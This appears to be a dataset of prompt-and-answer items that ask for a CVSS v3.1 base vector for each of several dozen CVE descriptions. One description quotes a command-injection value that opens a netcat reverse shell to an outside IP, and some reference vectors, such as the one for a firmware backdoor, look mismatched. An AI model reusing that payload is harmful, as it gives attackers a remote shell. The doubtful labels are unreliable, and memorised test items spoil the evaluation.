Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/grnmodify.php, in the grndate parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability classified as critical has been found in code-projects Online Faculty Clearance 1.0. This affects an unknown part of the file delete_faculty.php of the component HTTP GET Request Handler. The manipulation of the argument id leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250569 was assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Bref enable serverless PHP on AWS Lambda. When Bref is used with the Event-Driven Function runtime and the handler is a `RequestHandlerInterface`, then the Lambda event is converted to a PSR7 object. During the conversion process, if the request is a MultiPart, each part is parsed and its content added in the `$files` or `$parsedBody` arrays. The conversion process produces a different output compared to the one of plain PHP when keys ending with and open square bracket ([) are used. Based on the application logic the difference in the body parsing might lead to vulnerabilities and/or undefined behaviors. This vulnerability is patched in 2.1.13. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An origin validation vulnerability in the Trend Micro Apex One security agent could allow a local attacker to escalate privileges on affected installations.  Please note: an attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.  This vulnerability is similar to, but not identical to, CVE-2023-47195. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Input Validation in Hitron Systems DVR HVR-16781 1.03~4.02 allows an attacker to cause network attack in case of using defalut admin ID/PW. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An OS command injection vulnerability has been reported to affect QuMagie. If exploited, the vulnerability could allow authenticated users to execute commands via a network.  We have already fixed the vulnerability in the following version: QuMagie 2.2.1 and later 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Nextcloud files Zip app is a tool to create zip archives from one or multiple files from within Nextcloud. In affected versions users can download "view-only" files by zipping the complete folder. It is recommended that the Files ZIP app is upgraded to 1.2.1, 1.4.1, or 1.5.0. Users unable to upgrade should disable the file zip app. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Tenda AX1803 v1.0.0.1 contains a stack overflow via the iptv.city.vlan parameter in the function getIptvInfo. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A cross-site scripting (XSS) vulnerability in Task Manager App v1.0 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the Note Section parameter at /TaskManager/Tasks.php. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An issue was discovered in REDAXO version 5.15.1, allows attackers to execute arbitrary code and obtain sensitive information via modules.modules.php. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Transmit requests in Xen's virtual network protocol can consist of multiple parts.  While not really useful, except for the initial part any of them may be of zero length, i.e. carry no data at all.  Besides a certain initial portion of the to be transferred data, these parts are directly translated into what Linux calls SKB fragments.  Such converted request parts can, when for a particular SKB they are all of length zero, lead to a de-reference of NULL in core networking code. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Novel-Plus 4.3.0-RC1 and classified as critical. This issue affects some unknown processing of the file /novel/bookComment/list. The manipulation of the argument sort leads to sql injection. The exploit has been disclosed to the public and may be used. The identifier VDB-252185 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A flaw was found in the Linux kernel's memory deduplication mechanism. The max page sharing of Kernel Samepage Merging (KSM), added in Linux kernel version 4.4.0-96.119, can create a side channel. When the attacker and the victim share the same host and the default setting of KSM is "max page sharing=256", it is possible for the attacker to time the unmap to merge with the victim's page. The unmapping time depends on whether it merges with the victim's page and additional physical pages are created beyond the KSM's "max page share". Through these operations, the attacker can leak the victim's page. 	CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In the Linux kernel, the following vulnerability has been resolved:  pmdomain: mediatek: fix race conditions with genpd  If the power domains are registered first with genpd and *after that* the driver attempts to power them on in the probe sequence, then it is possible that a race condition occurs if genpd tries to power them on in the same time. The same is valid for powering them off before unregistering them from genpd. Attempt to fix race conditions by first removing the domains from genpd and *after that* powering down domains. Also first power up the domains and *after that* register them to genpd. 	CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross Site Scripting (XSS) vulnerability in JFinalcms 5.0.0 allows attackers to run arbitrary code via the name field when creating a new custom table. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An issue was discovered in open5gs v2.6.6. InitialUEMessage, Registration request sent at a specific time can crash AMF due to incorrect error handling of Nudm_UECM_Registration response. 	CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in MiczFlor RPi-Jukebox-RFID up to 2.5.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file userScripts.php of the component HTTP Request Handler. The manipulation of the argument folder with the input ;nc 104.236.1.147 4444 -e /bin/bash; leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251540. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Authentication Bypass by Capture-replay vulnerability in Mitsubishi Electric Corporation MELSEC WS Series WS0-GETH00200 all serial numbers allows a remote unauthenticated attacker to bypass authentication by capture-replay attack and illegally login to the affected module. As a result, the remote attacker who has logged in illegally may be able to disclose or tamper with the programs and parameters in the modules. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The PayHere Payment Gateway WordPress plugin before 2.2.12 automatically creates publicly-accessible log files containing sensitive information when transactions occur. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in realmag777 WPCS – WordPress Currency Switcher Professional allows Stored XSS.This issue affects WPCS – WordPress Currency Switcher Professional: from n/a through 1.2.0. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An authentication bypass vulnerability in the web component of Ivanti ICS 9.x, 22.x and Ivanti Policy Secure allows a remote attacker to access restricted resources by bypassing control checks. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Missing Integrity Check in Shelly TRV 20220811-152343/v2.1.8@5afc928c allows malicious users to create a backdoor by redirecting the device to an attacker-controlled machine which serves the manipulated firmware file. The device is updated with the manipulated firmware. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability, which was classified as critical, has been found in ForU CMS up to 2020-06-23. Affected by this issue is some unknown functionality of the file cms_admin.php. The manipulation of the argument a_name leads to sql injection. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251552. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Jinja is an extensible templating engine. Special placeholders in the template allow writing code similar to Python syntax. It is possible to inject arbitrary HTML attributes into the rendered HTML template, potentially leading to Cross-Site Scripting (XSS). The Jinja `xmlattr` filter can be abused to inject arbitrary HTML attribute keys and values, bypassing the auto escaping mechanism and potentially leading to XSS. It may also be possible to bypass attribute validation checks if they are blacklist-based. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in WP Event Manager WP User Profile Avatar allows Stored XSS.This issue affects WP User Profile Avatar: from n/a through 1.0. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In Plotly plotly.js before 2.25.2, plot API calls have a risk of __proto__ being polluted in expandObjectPaths or nestedProperty. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A improper neutralization of formula elements in a csv file in Fortinet FortiClientEMS version 7.2.0 through 7.2.2, 7.0.0 through 7.0.10, 6.4.0 through 6.4.9, 6.2.0 through 6.2.9, 6.0.0 through 6.0.8 allows attacker to execute unauthorized code or commands via specially crafted packets. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: PrestaShop Op'art Easy Redirect >= 1.3.8 and <= 1.3.12 is vulnerable to SQL Injection via Oparteasyredirect::hookActionDispatcher(). 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Using a javascript: URI with a setTimeout race condition, an attacker can execute unauthorized scripts on top origin sites in urlbar. This bypasses security measures, potentially leading to arbitrary code execution or unauthorized actions within the user's loaded webpage. This vulnerability affects Focus for iOS < 122. 	CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Vintage, member of the AXIS OS Bug Bounty Program, has found that the VAPIX API create_overlay.cgi did not have a sufficient input validation allowing for a possible remote code execution. This flaw can only be exploited after authenticating with an operator- or administrator-privileged service account. Axis has released patched AXIS OS versions for the highlighted flaw. Please refer to the Axis security advisory for more information and solution. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An attacker with access to a Management Console user account with the editor role could escalate privileges through a command injection vulnerability in the Management Console. This vulnerability affected all versions of GitHub Enterprise Server and was fixed in versions 3.11.3, 3.10.5, 3.9.8, and 3.8.13 This vulnerability was reported via the GitHub Bug Bounty program. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross Site Scripting Vulnerability in Elite CRM v1.2.11 allows attacker to execute arbitrary code via the language parameter to the /ngs/login endpoint. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Barangay Population Monitoring System v1.0 was discovered to contain a cross-site scripting (XSS) vulnerability in the Add Resident function at /barangay-population-monitoring-system/masterlist.php. This vulnerabiity allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the Contact Number parameter. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Command injection vulnerability in /usr/www/res.php in FLIR AX8 up to 1.46.16 allows attackers to run arbitrary commands via the value parameter. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The vulnerability allows a remote attacker to upload arbitrary files in all paths of the system under the context of the application OS user (“root”) via a crafted HTTP request. By abusing this vulnerability, it is possible to obtain remote code execution (RCE) with root privileges on the device. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross-site scripting (XSS) vulnerability in XunRuiCMS versions v4.6.2 and before, allows remote attackers to obtain sensitive information via crafted malicious requests to the background login. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
